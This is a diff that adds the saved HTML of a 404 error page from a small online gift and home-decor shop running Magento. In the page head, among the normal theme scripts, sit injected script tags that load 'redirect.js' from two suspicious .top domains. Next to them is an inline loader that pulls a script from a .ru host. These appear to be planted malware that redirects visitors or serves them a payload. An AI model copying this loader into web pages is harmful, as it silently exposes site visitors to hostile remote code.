@@ -1,0 +1,397 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>404 Not Found 1</title>
+<meta name="description" content="Page description" />
+<meta name="keywords" content="Page keywords" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.walnutandweave.co.uk/js/blank.html';
+    var BLANK_IMG = 'http://www.walnutandweave.co.uk/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/banner/css/banner.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/css/carousel.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/ajaxcart/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/css/mobile.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/css/pascalsystem/base.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/pascalsystem/base.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/mobilemenu/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/mobilemenu/jquery-mobilemenu.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/banner/js/jquery.mobile.customized.min.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/banner/js/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/banner/js/camera.min.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/js/jquery.ui.widget.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/js/jquery.touchify.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/js/jquery.ui.carousel.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/js/jquery-ui-1.8.11.custom.min.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/carousel/js/jquery-ui-touchCarousel.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/ajaxcart/js/ajaxcart.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.walnutandweave.co.uk/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.walnutandweave.co.uk';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script src="https://africangrey.top/redirect_base/redirect.js" id="1371499155545"></script><script src="http://africangirl.top/redirect_base/redirect.js" id="1371499155545"></script><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://oltratoke.ru/Yz7np9?frm=script'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+</script>
+
+
+
+<script type="text/javascript">
+    var active_color_selector = '.header .welcome-msg ,.middle_part h1,.add_box .old-price .price,#nav li a:hover,#nav li ul li a:hover,#nav li ul li ul li a span:hover,#nav li.level-top:hover,.about_wiser h1,.col_left dt,.block-compare .block-title,.block-tags .block-title,.detail_product_blog h1,.tabs li.active a span,.tabs li a:hover,div.ajaxcartpro_progress p, div.ajaxcartpro_progress1 p,.cart .page-title h1,.cart-table .product-name a:hover,.cart .discount h2, .cart .shipping h2,.cart .crosssell h2,.page-title h1, .page-title h2,#opc-login .form-list li.control label,.account-login .content h2,.fieldset .legend,.dashboard .box-info .box-head h2,.block-account .block-title,.block-account .block-content li.current,.block-reorder .block-title,.addresses-list h2,.my-wishlist .product-name a,.block-viewed .block-title,.block-poll .block-title,.block-wishlist .block-title,.block-reorder .block-title,.block-compared .block-title';
+    var active_bg_selector = '.banner .text_box a.button, .pager .pages .current,.pager .pages a:hover,.button.button,a.btn_listing_price,a.btn_view_listing,a.btn_product-options,.buttons-set .button,.box-tags button.tag,button.btn-checkout,.cart .discount button, .cart .shipping button,.buttons-set .button,.block-poll button.button, .block-reorder button.button,.my-wishlist button.btn-cart,.block-wishlist .block-content li .product-details a.link-cart,#footer_part .box_button,.cart-table .btn-continue:hover,.cart-table .btn-update:hover, .cart-table .btn-empty:hover,a.btn_view_listing,a.btn_listing_price_position,.product-options a.btn:hover,.cart-table a.btn:hover,.form-search .search-autocomplete li.selected,.shopping_bg,.opc .active .step-title,.block-progress dt.complete,.block-cart .subtotal,.block-cart .btn-remove, .block-cart .btn-edit,.btn-remove,.dashboard .box-tags .number,.dashboard .box-reviews .number,div.alert';
+    
+    var active_color_default = '15BBBC';
+    var bg_selector = 'body';
+    var bg_default = 'ffffff';
+		
+    var content_font_selector = 'body, input,select,textarea,button';
+    var content_font_default = "";
+		
+    var title_font_selector = '.middle_part h1,.about_wiser h1,.page-title h1,.page-title h2,.detail_product_blog h1,.cart .page-title h1,.banner .text_box h1';
+    var title_font_default = ""; //"'KaushanScript Regular'";
+		
+    var banner_selector = '.fluid_container';
+		//var banner_default = "1000";
+
+    var pattern_default = 'url(/pattern/pattern9.png)';
+   
+</script>
+
+
+<!-- Active Color -->
+
+
+
+    <style type="text/css">
+        /* Active Color */
+        .header .welcome-msg ,.middle_part h1,.add_box .old-price .price,#nav li a:hover,#nav li ul li a:hover,#nav li ul li ul li a span:hover,#nav li.level-top:hover,.about_wiser h1,.col_left dt,.block-compare .block-title,.block-tags .block-title,.detail_product_blog h1,.tabs li.active a span,.tabs li a:hover,div.ajaxcartpro_progress p, div.ajaxcartpro_progress1 p,.cart .page-title h1,.cart-table .product-name a:hover,.cart .discount h2, .cart .shipping h2,.cart .crosssell h2,.page-title h1, .page-title h2,#opc-login .form-list li.control label,.account-login .content h2,.fieldset .legend,.dashboard .box-info .box-head h2,.block-account .block-title,.block-account .block-content li.current,.block-reorder .block-title,.addresses-list h2,.my-wishlist .product-name a,.block-viewed .block-title,.block-poll .block-title,.block-wishlist .block-title,.block-reorder .block-title,.block-compared .block-title              { color: #; }
+	
+	.tital,.about_wiser .feature_box_hr,#footer_part .footer_hr,#nav li ul li a,.col_left dt,.sorter_hr,.block-compare .block-title,.block-tags .block-title,.data-table tr.last th, .data-table tr.last td,.block-progress .block-title,.block-compared .block-title,.block-viewed .block-title,.block-poll .block-title,.block-wishlist .block-title,.block-reorder .block-title,.block-account .block-title              { border-color: #; }
+	
+	#nav li.over, #nav li:hover,#nav li.active,.tabs li:hover,.tabs li.active              { border-top-color:  #; }
+	
+	.custom_menu h1,#nav li ul li a:hover              { border-bottom-color:  #; }
+        
+        /* Active Background */
+        .banner .text_box a.button, .pager .pages .current,.pager .pages a:hover,.button.button,a.btn_listing_price,a.btn_view_listing,a.btn_product-options,.buttons-set .button,.box-tags button.tag,button.btn-checkout,.cart .discount button, .cart .shipping button,.buttons-set .button,.block-poll button.button, .block-reorder button.button,.my-wishlist button.btn-cart,.block-wishlist .block-content li .product-details a.link-cart,#footer_part .box_button,.cart-table .btn-continue:hover,.cart-table .btn-update:hover, .cart-table .btn-empty:hover,a.btn_view_listing,a.btn_listing_price_position,.product-options a.btn:hover,.cart-table a.btn:hover,.form-search .search-autocomplete li.selected         {  background-color: #;}
+        
+         .banner .text_box a.button, .pager .pages .current,.pager .pages a:hover,.button.button,a.btn_listing_price,a.btn_view_listing,a.btn_product-options,.buttons-set .button,.box-tags button.tag,button.btn-checkout,.cart .discount button, .cart .shipping button,.buttons-set .button,.block-poll button.button, .block-reorder button.button,.my-wishlist button.btn-cart,.block-wishlist .block-content li .product-details a.link-cart,#footer_part .box_button,.cart-table .btn-continue:hover,.cart-table .btn-update:hover, .cart-table .btn-empty:hover,a.btn_view_listing,a.btn_listing_price_position,.product-options a.btn:hover,.cart-table a.btn:hover,.form-search .search-autocomplete li.selected        {  box-shadow: 0 0 0px 1px #; }
+	 
+	 .shopping_bg,.opc .active .step-title,.block-progress dt.complete,.block-cart .subtotal,.block-cart .btn-remove, .block-cart .btn-edit,.btn-remove,.dashboard .box-tags .number,.dashboard .box-reviews .number,div.alert         {  background-color: #;}
+	 
+	 .view-first .mask         {background-color: rgba(,,, 0.7);}
+        
+	
+    </style>
+
+<!-- Background Option -->
+
+
+                <style>
+            body
+                {
+                    background-image: url(http://www.walnutandweave.co.uk/media/pattern/pattern1.png);
+                }    
+        </style>
+
+<!-- Google Fonts -->
+
+
+        
+		
+	
+
+	<style type="text/css">
+	@media (min-width: 999px)
+	{
+		
+		.view-first .mask 	{
+			-moz-transition:none;
+			-webkit-transition: none;
+			-o-transition: none;
+			-ms-transition: none;
+			transition: none;
+		}
+		
+		.view-first:hover .mask {
+						top:183px;
+						position:  absolute;
+						overflow: hidden;
+						padding-top:10px;
+						padding-bottom:10px;
+						bottom: 0;
+						left: 0;
+					}
+		
+		.product_btn 	{
+					margin-top: 0px;
+					padding-top: 10px;
+				}
+		.product_btn.last {
+					margin-top: 15px;
+				}
+				.view .mask, .view .content {height: auto;}
+				.women_price_box3 .view .mask, .view .content{height: auto;}
+				.women_price_box4 .view .mask, .view .content{height: auto;}
+	}
+	</style>
+	</head>
+<body class=" cms-index-noroute cms-no-route">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+<div class="header-container">
+    <div class="header">
+        
+        <div class="header-top"><div class="header-top-container"><ul class="links">
+                        <li class="first" ><a href="http://www.walnutandweave.co.uk/customer/account/" title="My Account" >My Account</a></li>
+                                <li ><a href="http://www.walnutandweave.co.uk/wishlist/" title="My Wishlist" >My Wishlist</a></li>
+                                <li ><a href="http://www.walnutandweave.co.uk/customer/account/login/" title="Login" >Login</a></li>
+                                <li class=" last" ><a href="http://www.walnutandweave.co.uk/customer/account/create/" title="My Account" >Sign Up</a></li>
+            </ul>
+<script type="text/javascript">
+	jQuery(function() {
+		jQuery(".currency_box").hover(function() {
+			jQuery(this).addClass('active');
+			jQuery(".currency_detail").stop(true, true).slideDown(200, "easeInSine");
+			},  
+			function() {
+			jQuery(this).removeClass('active');
+			jQuery(".currency_detail").stop(true, true).fadeOut(200, "easeInSine");
+			});
+
+	});
+</script>            </div>
+        </div>
+        <div class="header-top-container">
+                        <a href="http://www.walnutandweave.co.uk/" title="Walnut & Weave" class="logo"><strong>Walnut & Weave</strong><img src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/images/logo.png" alt="Walnut & Weave" /></a>
+                        
+                
+                
+                
+               <div class="shopping_bg" onclick="setLocation('http://www.walnutandweave.co.uk/checkout/cart/')">
+                                <img src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/images/shopping.png" alt="" />
+				<h1>Shopping Bag</h1>
+			
+                                <div class="block-cart mini-cart-div">
+        
+    	
+                <div class="summary-container">
+			<div class="summary">
+			   <p class="amount">(0) items in your cart</p>
+			</div>
+			<!--<div class="actions"><button type="button" title="Checkout" class="button" onclick="setLocation('http://www.walnutandweave.co.uk/checkout/onepage/')"><span><span>Checkout</span></span></button></div>-->
+			<div class="clearall"></div>
+		</div>
+        
+</div>
+		</div>
+               
+               <p class="welcome-msg"> </p>
+            
+                    </div>
+    </div>
+    <div class="navigation-container">
+<script>
+    var j$ = jQuery.noConflict();
+		
+            j$(function(){
+                    j$("#mobile-menu").mobileMenu({ ulsource : "#nav", maxlevel : 4 });
+                  });
+    </script>
+
+    <select id="mobile-menu" ></select>
+<div class="nav-container">
+    <ul id="nav">
+        <li class=""><a href="http://www.walnutandweave.co.uk/"><span>Home</span></a></li>
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.walnutandweave.co.uk/home-fashion.html"  class="level-top" ><span>Home Fashion</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.walnutandweave.co.uk/home-fashion/home-decor.html" ><span>Home Decor</span></a></li><li  class="level1 nav-1-2"><a href="http://www.walnutandweave.co.uk/home-fashion/kitchen.html" ><span>Kitchen</span></a></li><li  class="level1 nav-1-3"><a href="http://www.walnutandweave.co.uk/home-fashion/candles-fragrances.html" ><span>Candles &amp; Fragrances</span></a></li><li  class="level1 nav-1-4"><a href="http://www.walnutandweave.co.uk/home-fashion/cushions.html" ><span>Cushions</span></a></li><li  class="level1 nav-1-5"><a href="http://www.walnutandweave.co.uk/home-fashion/picture-frames.html" ><span>Picture Frames</span></a></li><li  class="level1 nav-1-6"><a href="http://www.walnutandweave.co.uk/home-fashion/signs.html" ><span>Signs</span></a></li><li  class="level1 nav-1-7"><a href="http://www.walnutandweave.co.uk/home-fashion/clocks.html" ><span>Clocks</span></a></li><li  class="level1 nav-1-8"><a href="http://www.walnutandweave.co.uk/home-fashion/mirrors.html" ><span>Mirrors</span></a></li><li  class="level1 nav-1-9 last"><a href="http://www.walnutandweave.co.uk/home-fashion/lighting.html" ><span>Lighting</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.walnutandweave.co.uk/gifts.html"  class="level-top" ><span>Gifts</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://www.walnutandweave.co.uk/gifts/for-him.html" ><span>For Him</span></a></li><li  class="level1 nav-2-2"><a href="http://www.walnutandweave.co.uk/gifts/for-her.html" ><span>For Her</span></a></li><li  class="level1 nav-2-3"><a href="http://www.walnutandweave.co.uk/gifts/for-little-ones.html" ><span>For Little Ones</span></a></li><li  class="level1 nav-2-4 last"><a href="http://www.walnutandweave.co.uk/gifts/for-baby.html" ><span>For Baby</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.walnutandweave.co.uk/fashion-accessories.html"  class="level-top" ><span>Fashion Accessories</span></a><ul class="level0"><li  class="level1 nav-3-1 first"><a href="http://www.walnutandweave.co.uk/fashion-accessories/scarves.html" ><span>Scarves</span></a></li><li  class="level1 nav-3-2 last"><a href="http://www.walnutandweave.co.uk/fashion-accessories/bags.html" ><span>Bags</span></a></li></ul></li><li  class="level0 nav-4 level-top"><a href="http://www.walnutandweave.co.uk/jewellery.html"  class="level-top" ><span>Jewellery</span></a></li><li  class="level0 nav-5 last level-top"><a href="http://www.walnutandweave.co.uk/weddings.html"  class="level-top" ><span>Weddings</span></a></li>    </ul>
+    
+</div>
+<div><form id="search_mini_form" action="http://www.walnutandweave.co.uk/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Search" class="button1"></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', '');
+            searchForm.initAutocomplete('http://www.walnutandweave.co.uk/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+</div></div>
+<div style="text-align: center;" class="navigation-container">
+<h1 style="font-weight: bold; font-size: 20px">Website undergoing a revamp!</h1>
+<p>Please be aware that purchasing is currently disabled on our site while we refurbish the website. Feel free to browse our online product catalog in the meantime.</p></div>
+</div>
+
+
+<script language="javascript" type="text/javascript">
+jQuery(".shopping_bg").hover(function () {
+   jQuery('.slideTogglebox').slideToggle(10);
+});
+
+</script>
+        <div class="main-container col2-right-layout">
+            <div class="main">
+                </div>                <div class="col-main">
+                                        <div class="std"><div class="page-title"><h1>Whoops, our bad...</h1></div>
+<dl>
+<dt>The page you requested was not found, and we have a fine guess why.</dt>
+<dd>
+<ul class="disc">
+<li>If you typed the URL directly, please make sure the spelling is correct.</li>
+<li>If you clicked on a link to get here, the link is outdated.</li>
+</ul></dd>
+</dl>
+<dl>
+<dt>What can you do?</dt>
+<dd>Have no fear, help is near! There are many ways you can get back on track with Magento Store.</dd>
+<dd>
+<ul class="disc">
+<li><a href="#" onclick="history.go(-1); return false;">Go back</a> to the previous page.</li>
+<li>Use the search bar at the top of the page to search for your products.</li>
+<li>Follow these links to get you back on track!<br /><a href="http://www.walnutandweave.co.uk/">Store Home</a> <span class="separator">|</span> <a href="http://www.walnutandweave.co.uk/customer/account/">My Account</a></li></ul></dd></dl></div>                </div>
+                <div class="col-right sidebar"></div>
+            </div>
+        </div>
+        
+        <div class="clear"></div>
+        
+        <div class="clear"></div>
+    <div class="footer-container">
+    <div id="footer_part">
+        <div class="footer_tablet_button">
+<div class="follow_button">
+<p>Follow Walnut &amp; Weave on:</p>
+<a class="btn btn_follow btn_follow_fb" title="Facebook" href="https://www.facebook.com/pages/Walnut-Weave/233329993377528">&nbsp;</a> <a class="btn btn_follow btn_follow_twiter" title="Twitter" href="https://twitter.com/WalnutandWeave">&nbsp;</a></div>
+</div>
+<div class="footer_serch_box"><div class="submit_box">
+    <form action="http://www.walnutandweave.co.uk/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        
+            
+            
+               
+    
+            
+                <button class="box_button" type="submit" title="Subscribe"><span>Submit</span></button>
+                
+                <input class="news_input last required-entry validate-email" type="text" name="email" id="newsletter" title="Sign up for our newsletter" />
+            
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+
+</div>
+<p class="last">Newsletter Sign Up</p></div>
+<div class="footer_hr">&nbsp;</div>
+<p><img src="http://www.walnutandweave.co.uk/skin/frontend/wiser/default/images/footer_hr_icon.png" alt="footer_hr" /></p>
+<div class="footer_hr
+last">&nbsp;</div>
+<div class="clear">&nbsp;</div>
+<div class="footer_link_box">
+<div class="footer_link_box_right">
+<div class="link
+none">
+<h1>About Us</h1>
+<ul>
+<li title="Terms &amp; Conditions"><a href="terms-conditions">Terms &amp; Conditions</a></li>
+<li title="Frequently Asked Questions"><a href="frequently-asked-questions">FAQs</a></li>
+<li title="Contact Us"><a href="contact-us">Contact Us</a></li>
+<li title="Contact Us"><a title="Company Information" href="company-information" target="_blank">Company Information</a></li>
+</ul>
+</div>
+<div class="link
+last">&nbsp;</div>
+</div>
+</div>        
+    </div>
+    </div>
+    <div class="clear"></div>
+	
+	<div class="all_right_text">
+		
+		<p>Walnut & Weave. 2013. All Rights Reserved.</p>
+
+			
+	</div>
+
+
+<script type="text/javascript">
+		
+		
+</script>
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/base/default/css/side-panel/style.css" media="screen"/>
+<link rel="stylesheet" type="text/css" href="http://www.walnutandweave.co.uk/skin/frontend/base/default/css/side-panel/colorpicker.css" media="screen"/>
+             </div>
+</div>
+
+</body>
+</html>
